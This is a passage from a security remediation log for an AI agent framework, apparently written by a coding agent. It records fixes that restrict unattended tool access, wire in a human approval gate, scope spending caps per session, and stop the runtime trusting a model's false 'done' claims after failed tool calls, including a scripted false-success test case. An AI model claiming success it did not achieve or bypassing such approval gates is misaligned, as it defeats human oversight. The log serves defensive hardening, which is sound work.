  not that the class itself is safe to reach for casually now.

### SR-2.1 — Scheduled jobs defaulted to full capability_mode (unattended runs = interactive-session-level tool access)

- **Status: fixed.** Product-policy decision requested and confirmed
  with the operator before implementing (per prompt.md's requirement
  that default-value changes affecting existing deployments get
  explicit input, not be silently changed): scheduled jobs now default
  to `capability_mode="safe-chat"` (read-only tools only) instead of
  `"full"`, with an explicit per-job opt-in to `"full"`.
- **Reachability found:** `SchedulerManager._run_job()`
  (`missy/scheduler/manager.py`) constructed
  `AgentRuntime(AgentConfig(provider=job.provider))` with no
  `capability_mode` override at all, so every scheduled job ran with
  `AgentConfig`'s class default, `capability_mode="full"` — identical
  tool access (shell, filesystem write, browser, everything) to an
  interactive session, but running completely unattended on a timer
  with no human in the loop to catch a bad, hallucinated, or
  prompt-injected action before it executes. `ScheduledJob`
  (`missy/scheduler/jobs.py`) had no `capability_mode` field at all —
  there was no way to configure a job's tool access differently even
  if an operator wanted to.
- **Remediation evidence:** added `ScheduledJob.capability_mode: str =
  "safe-chat"` (a new field, round-tripped through `to_dict()`/
  `from_dict()`); a legacy `jobs.json` record written before this field
  existed gets `"safe-chat"` on load, not `"full"` — absence of an
  explicit value must not imply the most permissive option (fail
  closed), and an unrecognized/tampered stored value also falls back to
  `"safe-chat"` rather than being passed through unvalidated. Added
  `SchedulerManager.add_job(capability_mode: str = "safe-chat", ...)`
  with validation against `VALID_CAPABILITY_MODES = ("full",
  "safe-chat", "no-tools")` — deliberately excludes `"discord"`, a
  channel-specific mode not appropriate for an unattended scheduler
  run. `_run_job()` now threads `job.capability_mode` into
  `AgentConfig(provider=job.provider,
  capability_mode=job.capability_mode)`. Added `missy schedule add
  --capability-mode` (default `safe-chat`, `click.Choice`-constrained,
  same three values), and a `Mode` column in `missy schedule list`'s
  table for visibility. Live-verified via a real `SchedulerManager`
  end-to-end: a job created with default settings has
  `capability_mode == "safe-chat"`, and `_run_job()` constructs
  `AgentConfig` with `capability_mode="safe-chat"` (asserted via
  `MockConfig.assert_called_once_with(...)`, not just checking the
  stored field); a job explicitly created with `capability_mode="full"`
  retains full access through the same call path — the restricted
  default does not silently override an explicit opt-in. 20 new tests
  across `tests/scheduler/test_jobs.py` (defaults, round-trip,
  legacy-record fail-closed default, invalid-value fallback),
  `tests/scheduler/test_manager_extended.py` (real
  `SchedulerManager`/`_run_job` end-to-end), and
  `tests/cli/test_cli_commands.py` (CLI flag forwarding, invalid-value
  rejection). `tests/agent/`+`tests/tools/`+`tests/cli/`+
  `tests/scheduler/`+`tests/skills/`+`tests/unit/`+`tests/memory/`
  (10,060 tests) pass with no regressions; full suite 20,880 passed (up
  from 20,870), only the 3 known pre-existing vision flakes failing.
- **Residual risk:** this is a behavior change for any existing
  deployment with scheduled jobs already relying on implicit `"full"`
  tool access — on upgrade, those jobs' unattended runs will lose shell/
  filesystem-write/browser access unless the operator explicitly edits
  the job to `capability_mode="full"` (there is currently no `missy
  schedule edit` command; the only way to change an existing job's mode
  is to remove and re-add it, or hand-edit `~/.missy/jobs.json`). This
  is a deliberate, confirmed trade-off (least-privilege-by-default over
  silent continuity) rather than an oversight, but it should be called
  out prominently in release notes / a migration note if this branch
  ships. SR-2.2 (proactive trigger confirmation gating) is the
  remaining item in this pair; not yet implemented as of this
  checkpoint.

### SR-2.2 — Proactive triggers had no confirmation gate wired; ApprovalGate itself was never constructed anywhere in production

- **Status: fixed.** Product-policy decision requested and confirmed
  with the operator before implementing: proactive triggers should
  default to requiring confirmation, with a real `ApprovalGate` wired
  into the running gateway rather than either auto-running by default
  or being disabled outright.
- **Reachability found (two independent gaps, same root pattern as
  SR-2.1 — the mechanism existed but was disconnected from production):**
  1. `ProactiveTrigger.requires_confirmation` (`missy/agent/proactive.py`)
     defaulted to `False`, and the config-schema equivalent
     (`ProactiveTriggerConfig.requires_confirmation`,
     `missy/config/settings.py`, both the dataclass default and the
     raw-YAML parse default) also defaulted to `False` — so even though
     `ProactiveManager._fire_trigger()`'s gating logic itself was
     already correctly implemented and fail-closed (denies with
     `reason: "no_approval_gate"` when `requires_confirmation=True` but
     no gate is attached), no trigger ever reached that check by
     default; every proactive action auto-ran without any confirmation
     opportunity.
  2. `ApprovalGate` (`missy/agent/approval.py`) was a fully real,
     functional, already-tested class — but `grep -rn "ApprovalGate("
     missy/` found **zero** production construction sites; the only
     match was the class's own docstring example. Its
     `handle_response()` entry point (designed for free-text chat
     command parsing, e.g. "approve abc123") was likewise never called
     from anywhere. `ProactiveManager` was constructed in
     `cli/main.py`'s `gateway start` command with no `approval_gate`
     argument at all — so even a hypothetical `requires_confirmation=True`
     trigger would always hit the fail-closed "no gate" deny path, never
     an actual approval opportunity. Separately, the existing `missy
     approvals list` CLI command was a **hardcoded dead stub** —
     `console.print("No active gateway session...")` unconditionally,
     regardless of whether a gateway was actually running, because
     approval state lives in-process inside the `missy gateway start`
     process and a fresh `missy approvals list` invocation is a
     separate process with no way to reach that in-memory state.
- **Remediation evidence:** flipped both defaults to `True`
  (`ProactiveTrigger.requires_confirmation` and both the
  `ProactiveTriggerConfig` dataclass default / raw-YAML parse default)
  — an unattended proactive action now requires confirmation unless a
  specific trigger deliberately opts out. Constructed a real,
  process-shared `ApprovalGate` in `cli/main.py`'s `gateway start`
  command (before both the `ProactiveManager` and Web API server
  construction sites) with a working `send_fn` that prints to console
  and logs at info level; wired it into both
  `ProactiveManager(approval_gate=...)` and
  `ApiServer(approval_gate=...)` so both consumers share one gate
  instance. Added `ApprovalGate.approve_by_id(id)`/`.deny_by_id(id)`
  methods (clean REST semantics — returns `bool` rather than requiring
  free-text command parsing) alongside the existing `handle_response()`.
  Added three new authenticated REST endpoints on the already-running
  Web API server (`missy/api/server.py`, following the exact routing/
  auth pattern already used for `/controls` and `/scheduler/jobs`):
  `GET /api/v1/approvals` (list pending), `POST
  /api/v1/approvals/{id}/approve`, `POST /api/v1/approvals/{id}/deny`
  — this is the actual mechanism that makes cross-process approval
  possible, since the gateway's in-memory `ApprovalGate` state is
  otherwise unreachable from a separate CLI invocation. Rewrote `missy
  approvals list` (previously the hardcoded dead stub) plus new `missy
  approvals approve/deny ID` commands to make real authenticated HTTP
  calls against this endpoint, reading the persisted
  `~/.missy/secrets/web_console.key` the same way other CLI commands
  already do, with graceful `ConnectError` handling when no gateway is
  running (falls back to essentially the old stub message, but now
  correctly conditional on actual reachability rather than always
  printed). Live-verified end-to-end via real HTTP requests against a
  real running `ApiServer` with a real `ApprovalGate`: a request blocked
  in a background thread on `gate.request(...)` appears via `GET
  /approvals`, and `POST .../approve` genuinely unblocks it (confirmed
  the waiting thread's exception/success state changes accordingly);
  same for deny. Live-verified the `cli/main.py` wiring itself: patched
  `ProactiveManager` to capture its constructor kwargs during a real
  `gateway start` invocation and asserted `approval_gate` is a genuine
  `ApprovalGate` instance, not `None` or a mock.
- **Test-fixture fallout (expected, not a regression):** the default
  flip broke 23 pre-existing tests across 6 files whose actual purpose
  was testing cooldown/template-rendering/callback-firing logic, not
  confirmation gating itself — they constructed `ProactiveTrigger`
  without setting `requires_confirmation` and implicitly relied on the
  old `False` default to reach the callback at all. Fixed by adding
  `requires_confirmation=False` to the affected constructions/shared
  test factories (the small number of tests that are genuinely *about*
  confirmation gating already explicitly passed
  `requires_confirmation=True` and were unaffected by the default
  flip). 30+ new/updated regression tests overall:
  `tests/agent/test_approval_gate.py` (4 new — `approve_by_id`/
  `deny_by_id` happy-path and unknown-id-returns-False cases),
  `tests/api/test_server.py::TestApprovalsEndpoints` (8 new, real HTTP
  against a real server+gate), `tests/cli/test_cli_main_gaps.py` (1 new
  — real `gateway start` wiring assertion). `tests/agent/`+`tests/api/`+
  `tests/cli/`+`tests/config/`+`tests/scheduler/`+
  `tests/security/`+`tests/unit/` all pass with no regressions beyond
  the expected fixture updates; full suite 20,893 passed (up from
  20,880), only the 3 known pre-existing vision flakes failing.
- **Residual risk:** no Web TUI browser page exists yet for
  approvals — the REST endpoints are real and authenticated, but an
  operator must currently use `missy approvals list/approve/deny` (or a
  raw HTTP client) rather than clicking through the browser console;
  building that page is a reasonable follow-up but out of scope for
  this checkpoint (which was specifically "wire a real ApprovalGate,"
  not "build a full approval UI"). Also a behavior change for existing
  deployments with proactive triggers already configured and relying on
  implicit auto-run (same category of trade-off as SR-2.1, same
  mitigation: explicit `requires_confirmation: false` per trigger in
  YAML config to opt back into auto-run) — should be called out in
  release notes alongside SR-2.1's note if this branch ships.

### SR-3.4 residual — CostTracker aggregated spend across sessions instead of per-session, contradicting its own documented contract

- **Status: fixed.** This is the residual sub-finding explicitly left
  open when SR-3.4's ordering defect was fixed earlier in this session
  ("the cross-session-aggregation sub-finding ... is a separate
  architectural question ... not addressed by this ordering fix").
  Investigated and closed as its own checkpoint.
- **Reachability found (live-verified, and confirmed a documented-vs-
  actual-behavior mismatch, not merely a design gap):**
  `AgentConfig.max_spend_usd`'s own inline comment reads `# 0 =
  unlimited; per-session cost cap`, and `CostTracker`'s own module
  docstring / class docstring both describe it as per-session tracking.
  But `AgentRuntime.__init__` constructed exactly one
  `CostTracker` instance (`self._cost_tracker`) shared by the entire
  runtime for its whole lifetime, and every session that ran through
  that runtime accumulated into the *same* `_total_cost` counter.
  `_check_budget(session_id=..., task_id=...)` and
  `_record_cost(response, session_id=...)` both already threaded
  `session_id` through as a parameter — but only ever used it for audit
  logging, never for scoping the actual enforcement, which is the
  precise "declared behavior doesn't match dispatch behavior" pattern
  this session found repeatedly in other subsystems (SR-1.4/1.5, SR-3.3).
  Because `AgentRuntime` is explicitly constructed once and reused
  across every session it serves in real deployments (`missy gateway
  start` builds one shared runtime instance for all Discord users, all
  Web API sessions — confirmed by rereading that construction site),
  this was live and exploitable: one user/session exhausting the
  configured budget silently blocked every other user/session sharing
  that process, even though `max_spend_usd` is documented and intended
  as a per-user/per-session cap, not a process-wide one.
  Live-reproduced: constructed a real `AgentRuntime` with
  `max_spend_usd=0.01`, recorded enough usage against session "alice"
  to exceed the cap, then called `_check_budget(session_id="bob")` for
  an unrelated session that had recorded zero cost of its own — `bob`
  was incorrectly denied with `BudgetExceededError` due to `alice`'s
  spend. Confirmed via `git stash` that this reproduces on the pre-fix
  tree and is fixed on the post-fix tree (`bob` now proceeds normally).
- **Remediation evidence:** replaced the single `self._cost_tracker`
  instance with `self._cost_trackers: dict[str, CostTracker]` keyed by
  `session_id`, plus a `self._cost_tracking_enabled: bool` master switch
  (preserving the old "cost tracking entirely disabled" semantics that
  `self._cost_tracker = None` used to express). Added
  `_get_cost_tracker(session_id)` (lazily creates and caches a
  per-session tracker, thread-safe via a lock, bounded at 5,000
  concurrently tracked sessions with oldest-first eviction to prevent
  unbounded memory growth in a long-running shared process — matching
  the same eviction pattern `CostTracker` itself already uses for
  per-call usage records) and `_peek_cost_tracker(session_id)` (a
  non-side-effecting read-only variant for the `agent.run.complete`
  audit-event summary site, so a session that never actually recorded
  any cost doesn't get a fabricated empty tracker entry). Updated all 3
  real call sites (`_record_cost`, `_check_budget`, and the
  `agent.run.complete` cost-summary read) to route through the new
  per-session accessor. Live re-verified the exact reproduction above
  now passes: `alice` is still correctly denied once her own spend
  exceeds the cap (the ordering fix from earlier in this session is
  fully preserved — `provider.complete`/`complete_with_tools` are still
  never called for a denied session), while `bob`'s independent, unspent
  budget is completely unaffected by `alice`'s usage, confirmed both via
  direct `_check_budget()` calls and end-to-end through the real
  `_single_turn()` dispatch path (session B's actual provider call
  proceeds and returns its real response while session A's identical
  call is denied pre-flight). 7 new regression tests plus 25 pre-existing
  tests updated across 9 files: `tests/agent/test_runtime_enhancements.py`
  gained a new `TestCostTrackerCrossSessionIsolation` class (6 tests:
  isolation, independent totals, same-session-returns-same-instance,
  peek-doesn't-create, disable-applies-globally, bounded-eviction) plus
  one new end-to-end cross-session dispatch test in the existing
  `TestBudgetCheckedBeforePaidCall` class (7 new tests total); 9
  pre-existing tests in that same file were updated from directly
  poking a single shared `runtime._cost_tracker` to using session-scoped
  `_get_cost_tracker(...)` calls matching each test's actual session_id,
  preserving their original intent rather than just making them pass
  mechanically. 16 other pre-existing tests across 9 additional files
  (`tests/agent/test_runtime_coverage_gaps.py`,
  `tests/agent/test_coverage_gaps.py`,
  `tests/agent/test_runtime_config_edges.py`,
  `tests/agent/test_runtime_tool_output_injection.py`,
  `tests/agent/test_tool_intelligence_wiring.py`,
  `tests/agent/test_runtime_streaming.py`,
  `tests/unit/test_gateway_timeout_url_validation.py`,
  `tests/unit/test_hardening_piper_discord.py`,
  `tests/unit/test_coverage_gaps_vault_hotreload.py`) that disabled or
  mocked cost tracking via the old single-attribute pattern were updated
  to the new `_cost_tracking_enabled` flag or `patch.object(runtime,
  "_get_cost_tracker", ...)` pattern, matching each test's real intent
  (disable-tracking tests vs. inject-a-specific-mock-tracker tests) case
  by case rather than a blanket mechanical rename.
  `tests/agent/`+`tests/unit/`+`tests/security/`+`tests/cli/`+
  `tests/api/`+`tests/scheduler/` (9,979 tests) pass with no
  regressions; full suite 20,900 passed (up from 20,893), only the 3
  known pre-existing vision flakes failing.
- **Residual risk:** none identified for the core cross-session-
  aggregation finding. The per-session tracker dict is in-memory only —
  a process restart resets every session's accumulated spend to zero
  (arguably a reasonable, even desirable property for a live budget
  window, but worth noting explicitly: it means `max_spend_usd` is a
  per-session-per-process-lifetime cap, not a truly durable
  cross-restart cap). Durable historical cost data already exists
  independently via `SQLiteMemoryStore.record_cost()`/`get_session_costs()`
  (used by `missy cost --session`), which was already correctly
  per-session-scoped before this fix and is unaffected by it — only the
  live in-memory *enforcement* path had the aggregation bug.

### SR-4.1 (SR-4.4) — Done-criteria "verification engine" was a static prompt instruction, not wired to any tool-observed evidence

- **Status: fixed** for the core completion-trust gap. First §4 item
  addressed this session — moving from the security-review-remediation
  sections (§1–§3, now closed except SR-1.1/SR-1.9b) into "Advertised
  But Unwired Features."
- **Reachability found (live-verified):** `missy/agent/done_criteria.py`
  advertises a "DONE criteria engine" with `is_compound_task()` (detects
  multi-step prompts), `make_done_prompt()` (asks the model to define
  its own completion conditions), a `DoneCriteria` dataclass
  (`conditions`/`verified`/`all_met`/`pending` — the only piece capable
  of holding real, externally-verified per-condition state), and
  `make_verification_prompt()` (a static nudge string). Grepped every
  production call site: `is_compound_task`, `make_done_prompt`, and
  `DoneCriteria` are **never used anywhere** in `AgentRuntime` or
  elsewhere — completely dead code. Only `make_verification_prompt()`
  is used, and only in one place: `_tool_loop()` appends its fixed text
  to the conversation after every round where the model chooses to keep
  calling tools (`finish_reason == "tool_calls"`). Critically, the
  *other* branch — where the model declares `finish_reason == "stop"`
  and the loop returns immediately — had **zero verification of any
  kind**: no check of whether the immediately preceding round of tool
  calls actually succeeded, no code-level cross-reference against
  `ToolResult.is_error`, nothing. The model's own text claim of success
  was trusted completely unconditionally, even directly following a
  tool call that errored. Live-reproduced end-to-end through the real
  `AgentRuntime.run()`/`_tool_loop()`: simulated a `calculator` tool
  call that errored, immediately followed by the model responding
  `"Done! I successfully computed the result."` with
  `finish_reason="stop"` — the runtime returned that text as the final
  answer with zero rejection, zero audit event, and zero additional
  verification of any kind. Confirmed via `git stash` this reproduces
  on the pre-fix tree.
- **Remediation evidence:** added a deterministic, tool-observed
  completion gate directly in `_tool_loop()`. Rather than reusing the
  existing `_mutation_fp_errors` dict (which tracks errors keyed by
  exact tool-name+arguments fingerprint and is designed to stay
  populated until the *exact same* call succeeds — investigated and
  rejected as the basis for this gate because a corrected retry
  necessarily uses different arguments/a different fingerprint, so
  gating on "any fingerprint ever errored" would keep rejecting
  completion long after the model successfully recovered via a
  different call), added a new `_last_round_errors` list that is
  overwritten (not accumulated) after every round of tool execution,
  reflecting only the *immediately preceding* round's
  `ToolResult.is_error` outcomes. When `finish_reason == "stop"` or
  `"length"` and `_last_round_errors` is non-empty, the completion claim
  is rejected: the model is told exactly which tool call(s) errored and
  instructed to retry or explain, and the loop continues rather than
  returning — up to `_MAX_DONE_VERIFICATION_RETRIES = 2` attempts. Each
  rejection emits an `agent.done_criteria.rejected` audit event
  (`result: "deny"`). If retries are exhausted and the error is still
  unresolved, the response is still returned (the runtime does not
  silently rewrite or discard a model's response — that could corrupt
  legitimate content) but an `agent.done_criteria.unverified` audit
  event (`result: "warn"`) makes the gap visible rather than treating it
  as a verified success. Live re-verified all three cases end-to-end
  through the real `AgentRuntime.run()`: (1) an unresolved error is
  rejected twice then accepted-with-warning on the third attempt, never
  trusted on the first; (2) a genuinely successful tool call never
  triggers any rejection or extra provider calls (zero behavior change
  for the happy path); (3) an error followed by a *later, successful*
  round (a corrected retry) is accepted immediately on the very next
  "done" claim — confirming the fingerprint-history alternative design
  would have been wrong and the most-recent-round-only design is
  correct. Fixed 5 pre-existing tests across 4 files whose scenarios
  triggered a genuine tool error followed by an unretried "stop" claim
  — each needed additional mocked provider responses to accommodate the
  new bounded retry behavior (their actual assertions, e.g. "the denied
  tool call never reached `registry.execute()`", were preserved and
  still pass; none were weakened). Added 3 new regression tests in
  `tests/agent/test_runtime_deep.py::TestDoneCriteriaEnforcement`
  covering exactly the three cases above. `tests/agent/`+`tests/unit/`+
  `tests/security/`+`tests/cli/`+`tests/api/` (9,637 tests) pass with
  no regressions; full suite 20,903 passed (up from 20,900), only the 3
  known pre-existing vision flakes failing. Corrected
  `missy/agent/done_criteria.py`'s module docstring, which implied the
  whole module was an integrated "engine" — it now states plainly which
  pieces are wired (only `make_verification_prompt()`) and which remain
  dead code (`is_compound_task`, `make_done_prompt`, `DoneCriteria`).
- **Residual risk:** `is_compound_task()`, `make_done_prompt()`, and the
  `DoneCriteria` dataclass remain unused. These represent a genuinely
  different, softer feature (having the model declare its own
  candidate completion conditions upfront, then track which are met) —
  not strictly required to close the "false completion claims are
  trusted unconditionally" security gap, which this checkpoint's
  code-level `ToolResult.is_error`-based gate closes independent of
  whether the model ever articulates conditions at all. If a future
  session wants the full compound-task-detection UX (proactively
  showing the model's own DONE checklist), that dead code is available
  to build on, but it is not itself a security requirement. Also
  unaddressed: the gate only catches errors from *tool calls*; a model
  that fabricates a false success claim without ever calling a tool at
  all (e.g. claiming a file was created when it never attempted the
  `file_write` call) is not caught by this mechanism — that class of
  claim requires the broader FX-C-style "ground factual claims in fresh
  evidence" work already addressed elsewhere this session for specific
  subsystems (memory IDs, Incus state), not a generic solution.

### SR-4.2 (SR-4.5) — `self_create_tool` claimed created scripts were "registered at startup"; nothing anywhere loads them into the live ToolRegistry

- **Status: fixed** (product-policy decision confirmed with operator:
  keep the feature proposal-only, do not build dynamic tool loading).
- **Reachability found (verified by direct code inspection, not
  inference):** `missy/tools/builtin/self_create_tool.py`'s module
  docstring stated "Custom tools are scripts stored in
  `~/.missy/custom-tools/` and registered at startup." Its `execute()`
  method's success message on `action="create"` read `"Custom tool
  '{tool_name}' created at {script_path}"`. `docs/implementation/module-map.md`
  described the tool as "Dynamic tool creation." All three statements
  are false: `grep -rn "custom-tools\|CUSTOM_TOOLS_DIR"
  missy/` matches only `self_create_tool.py` itself — no other file in
  the codebase reads `~/.missy/custom-tools/`, no startup hook scans it,
  and `ToolRegistry.register()` (the only method that makes a tool
  callable) has exactly one call site pattern, `registry.register(<a
  concrete BaseTool subclass instance>)`, all of which are the
  first-party built-in tools enumerated in
  `missy/tools/builtin/__init__.py` — never anything constructed from a
  file under `custom-tools/`. A script written by `self_create_tool` can
  therefore never be called by the agent, in any configuration, ever —
  the model is told (via its own tool's success message) that it just
  created a usable tool, and `action="list"` echoes the illusion back
  by showing it as an existing entry with a description, exactly like a
  real available capability.
- **Product-policy decision, asked and confirmed before implementing:**
  the review itself frames this as "either securely register and
  execute approved outputs through the normal registry/policy/benchmark
  lifecycle, or clearly keep the feature proposal-only" — a genuine
  choice, not a mechanical bug. Building real dynamic loading means
  agent-authored code becomes an auto-executable tool (even gated
  behind human approval, this is a meaningfully larger security surface
  than anything else in this codebase, since every other tool's code is
  first-party and reviewed pre-deployment). Operator chose: **keep
  proposal-only, fix the false "created"/"registered" claims** — the
  smaller, faster, most conservative option, consistent with this
  session's established default of picking the more restrictive option
  absent an explicit reason to expand capability.
- **Remediation evidence:** rewrote every user-facing and
  developer-facing string this tool touches to say "proposal" and
  "written for review," never "created" or "registered": the module
  docstring, the tool's `description` schema field (now explicitly
  states proposals are NOT automatically registered or callable), the
  `list` action's header and empty-state message ("No custom tool
  proposals on file" / "Custom tool PROPOSALS on file (not
  registered/callable -- pending human review)"), the `create` action's
  success message (now: "Proposal script '{name}' written to {path} for
  human review. This is NOT a registered or callable tool ... Tell the
  user/operator the proposal exists; do not treat it as available to
  call."), and the `delete` action's messages ("Deleted custom tool
  proposal" / "Tool proposal not found"). Corrected
  `docs/implementation/module-map.md`'s one-line description and added
  an explicit paragraph to `docs/security.md`'s "Custom Tool Content
  Validation" section stating plainly that proposals are not
  automatically loaded, with a pointer to this finding. Live-verified
  end-to-end via the real `SelfCreateTool` class (not a mock): a
  `create` call's returned `ToolResult.output` and a subsequent `list`
  call's output both now explicitly disclaim registration/callability.
  Confirmed via `grep -rn "custom-tools\|CUSTOM_TOOLS_DIR" missy/` one
  more time post-fix that the "nothing loads this directory" claim in
  the new docstring/docs text is still accurate (no new loader was
  introduced, matching the chosen scope). Updated 3 pre-existing test
  files' string assertions (`"No custom tools"` → `"No custom tool
  proposals"`) to match the corrected, more honest wording — no test
  assertion was weakened or had its actual check removed, only the
  literal matched substring was updated to track the intentionally
  changed (not accidentally broken) output text.
  `tests/tools/test_self_create_tool.py`+`tests/tools/test_builtin_tools.py`+
  `tests/unit/test_discord_upload_self_create_tool_coverage.py`+
  `tests/unit/test_vault_audit_discovery_tools_coverage.py`+
  `tests/security/test_scheduler_jobs_selfcreate_webhook_mcp_hardening.py`+
  `tests/security/test_self_create_tool_expanded_blocklist.py`+
  `tests/security/test_self_create_tool_script_validation.py` (363
  tests) pass. `tests/tools/`+`tests/unit/`+`tests/security/` (5,782
  tests) pass with no regressions.
- **Residual risk:** no security gap remains from this specific finding
  — the tool's actual behavior (write files, never load them) now
  matches what it tells the model and the operator. The underlying
  product question ("should Missy ever support real agent-authored
  custom tools") remains open and unbuilt; if a future session decides
  to build it, `AUDIT_SECURITY.md`'s reasoning here (proposal-only was
  chosen specifically because unreviewed agent-authored code becoming
  auto-executable is a large security-surface expansion) should inform
  the design — at minimum a human `ApprovalGate` step, explicit
  `ToolPermissions` declaration validated against the same policy
  engine every other tool goes through, and probably sandboxed/
  benchmarked execution before the first live call, not simply
  `exec()`-ing whatever the model wrote.

### SR-4.3 — `missy recover` could list interrupted tasks but never actually resume one

- **Status: fixed.** Third §4 item; unlike SR-4.5, the review's own
  "...or stop advertising recovery" alternative was rejected here in
  favor of building the real feature, because resuming a checkpoint
  doesn't expand what's callable — it only continues something already
  fully authorized to run, through the exact same per-call policy
  enforcement as any fresh run. That's a materially different security
  calculus than SR-4.5's "should agent-authored code become
  auto-executable" question, so no product-policy question needed to be
  asked here.
- **Reachability found:** `missy/agent/checkpoint.py`'s module
  docstring claimed "On startup (`AgentRuntime.__init__`), incomplete
  checkpoints are scanned and classified for recovery" — true as far as
  it went, but `CheckpointManager.classify()` labels checkpoints under 1
  hour old `"resume"`, under 24 hours `"restart"`, and the CLI's
  `missy recover` table displays exactly that recommendation to the
  operator. Grepped every call site: `grep -rn "\.resume(\|def resume\|restore_checkpoint\|resume_checkpoint\|load_checkpoint"
  missy/` (before this fix) matched nothing except an unrelated
  `SchedulerManager.resume_job()` (pause/resume of *scheduled jobs*, a
  completely different feature). `AgentRuntime` had no method that ever
  read a checkpoint's persisted `loop_messages`/`iteration` back and
  continued the tool loop from it — `missy recover`'s output table
  recommended "resume" as an action the operator could not actually
  take; the only real action available was `--abandon-all`.
  `_tool_loop()` does write real, replayable state
  (`_cm.update(_checkpoint_id, loop_messages, tool_names_used,
  iteration)`), and — critically for safety — only ever does so
  *after* a full round's tool calls and their results have all been
  appended to `loop_messages`, never mid-call, so every saved
  checkpoint represents a safe boundary to resume from (no tool call
  could ever be replayed by feeding the saved messages back into a
  fresh provider call).
- **Remediation evidence:** added `CheckpointManager.get(checkpoint_id)`
  (single-row lookup in any state, needed to distinguish "not found"
  from "found but not resumable" — `get_incomplete()` only returns
  `RUNNING` rows). Added `validate_loop_messages()`, a conservative
  schema gate (must be a non-empty list of dicts; each entry's `role`
  must be one of `user`/`assistant`/`tool`/`system`; `tool` entries must
  carry `name`/`content`; `assistant` entries with `tool_calls` must
  have each call carry a `name`) — rejects anything that doesn't look
  exactly like what `_tool_loop()` itself writes, rather than trying to
  coerce malformed data into something usable. Added
  `AgentRuntime.resume_checkpoint(checkpoint_id)`: loads the checkpoint,
  fails closed with `ValueError` if not found or not `RUNNING` (a
  `COMPLETE`/`FAILED`/`ABANDONED` checkpoint cannot be resumed), fails
  closed with a new `CheckpointCorruptedError` (checkpoint marked
  `FAILED` first, so it's never offered for resume again) if
  `loop_messages` fails schema validation, then re-resolves both the
  system prompt (persona/behavior/memory-synthesis may have changed)
  and the tool set (`_get_tools()`, under the *current*
  `capability_mode`/`tool_policy` — this is the policy-revalidation
  requirement: if config has tightened since the checkpoint was
  created, the resumed run only gets the narrower set, exactly like any
  fresh run would, with zero special-case code needed since every tool
  call already goes through `ToolRegistry._check_permissions()` on
  every dispatch, resumed or not) before handing the saved
  `loop_messages` to the real `_tool_loop()`. Idempotency: relies on the
  invariant above (checkpoints only saved at a safe round boundary) —
  live-verified by constructing a checkpoint mid-task (one completed
  tool round, no final answer yet) and confirming resume calls the
  provider with exactly the saved history, never re-invokes the already-
  completed tool call, and reaches a genuine final answer. The old
  checkpoint is marked `COMPLETE` immediately after its data is
  validated and handed off (before the resumed `_tool_loop()` runs, so
  a concurrent `missy recover --resume` on the same ID cannot double-
  resume it) — the resumed run gets its own new checkpoint via
  `_tool_loop()`'s existing internal `_cm.create()`/`.complete()`/
  `.fail()` calls, unaffected by this change. Added `missy recover
  --resume ID` (plus `--provider` to override) which constructs a real
  `AgentRuntime` and calls `resume_checkpoint()`, printing the response
  or a clear error for the not-found/not-resumable/corrupted cases;
  updated the CLI's own "recommended action" hint text to mention it.
  Live-verified end-to-end via a real `CheckpointManager` (isolated
  `HOME`, real SQLite, no mocks) plus a mocked provider: (1) happy path
  — a checkpoint with a completed `calculator` round resumes to a real
  "The answer is 4." response, the saved messages are actually what was
  sent to the provider, and the old checkpoint transitions to
  `COMPLETE`; (2) non-existent checkpoint ID raises `ValueError`,
  provider never called; (3) a `COMPLETE`-state checkpoint raises
  `ValueError` ("not resumable"), provider never called; (4) corrupted
  `loop_messages` (both invalid JSON, which `_row_to_dict()`'s existing
  exception handling degrades to `[]`, and valid-JSON-wrong-shape, e.g.
  a list of bare strings) raises `CheckpointCorruptedError` and marks
  the checkpoint `FAILED`, provider never called; (5) a checkpoint
  resumed under `capability_mode="no-tools"` genuinely receives an empty
  tool list in the provider call, confirming policy revalidation is
  live, not just claimed. Corrected `docs/implementation/module-map.md`'s
  entry (was: "Enables `missy recover` to resume incomplete sessions" —
  now true instead of aspirational; also fixed its "Key exports" line,
  which named a nonexistent `Checkpoint` class instead of the real
  `CheckpointManager`) and `CLAUDE.md`'s CLI command table. 24 new
  regression tests across `tests/agent/test_checkpoint.py` (get(),
  validate_loop_messages()) and `tests/agent/test_runtime_deep.py`
  (`TestResumeCheckpoint`, 6 tests exercising the real
  `AgentRuntime.resume_checkpoint()` path against a real SQLite-backed
  `CheckpointManager`), plus 4 new CLI tests in
  `tests/cli/test_cost_recover.py`. `tests/agent/`+`tests/cli/`+
  `tests/unit/`+`tests/security/`+`tests/scheduler/` (9,853 tests) pass
  with no regressions.
- **Residual risk:** the total iteration budget resets to
  `max_iterations` on resume rather than continuing from where the
  original run's counter left off (e.g. a task interrupted at iteration
  8 of 10 gets a fresh 10 iterations after resume, not 2). This is a
  deliberate simplification, not a safety gap — it only ever grants a
  resumed task *more* room to finish, never less, and every one of
  those additional iterations still goes through the same per-call
  policy/budget enforcement as any other iteration. A future session
  could thread the original iteration count through if exact budget
  parity across resume is ever required. Also unaddressed: no
  automatic/scheduled resume — an operator must run `missy recover
  --resume ID` manually; `ProactiveManager` does not currently retry
  interrupted tasks on its own (out of scope for this finding, which was
  about the resume mechanism existing at all, not about triggering it
  automatically).

### SR-4.4 (SR-4.2) — `SubAgentRunner`/`delegate_task` were entirely dead code, and the claimed concurrency was fake

- **Status: fixed.** Fourth §4 item. Product-policy decision confirmed
  with operator before implementing: wire sub-agent delegation into
  production with real limits, rather than the review's alternative of
  documenting the feature as unavailable.
- **Reachability found:** `grep -rn "SubAgentRunner\|parse_subtasks"
  missy/ --include=*.py` (before this fix) matched only
  `missy/agent/sub_agent.py` itself — no tool, CLI command, or runtime
  code anywhere constructed or invoked it; it was entirely unreachable
  dead code, worse than SR-4.5's finding (self_create_tool was at least
  a real, dispatchable tool whose *output* wasn't consumable — here
  nothing consumed the class at all). Its claimed concurrency was also
  fake: `SubAgentRunner.__init__` constructed a
  `threading.Semaphore(MAX_CONCURRENT)`, but `run_all()`'s body was a
  plain `for task in subtasks: result = self.run_subtask(task, ...)`
  loop — nothing ever contended on that semaphore because nothing ran
  concurrently. It also had no cross-child budget aggregation (each
  subtask got a wholly independent `AgentRuntime` via a
  `runtime_factory` callable, with its own from-scratch
  `_cost_trackers` dict — a sub-agent's spend could never be checked
  against the parent call's `max_spend_usd` cap) and no recursion-depth
  guard at all (nothing prevented a wired-in version from nesting
  delegation indefinitely).
- **Remediation evidence:** redesigned `SubAgentRunner` to take a
  *shared* `runtime`/`session_id`/`depth` (reused across every subtask)
  instead of a `runtime_factory` — this single change is what makes
  budget aggregation work for free: every subtask calls
  `self._runtime.run(prompt, session_id=self._session_id,
  _delegation_depth=self._depth)` on the *same* `AgentRuntime` instance
